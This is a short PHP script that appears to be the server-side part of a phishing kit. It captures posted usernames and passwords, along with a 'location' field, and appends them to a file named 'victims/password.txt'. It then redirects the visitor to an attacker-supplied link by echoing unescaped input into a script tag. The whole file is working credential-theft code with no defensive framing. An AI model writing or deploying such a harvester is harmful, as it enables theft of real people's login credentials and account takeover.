<?php 
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{


 file_put_contents(".././victims/password.txt", "\nusername=" . $_POST['username']. "\npassword=".$_POST['password']."\n\nFrom=".$_POST['location']."\n", FILE_APPEND);


	echo "<script>window.location.replace('".$_POST['link']."');</script>";

 }
 

?>
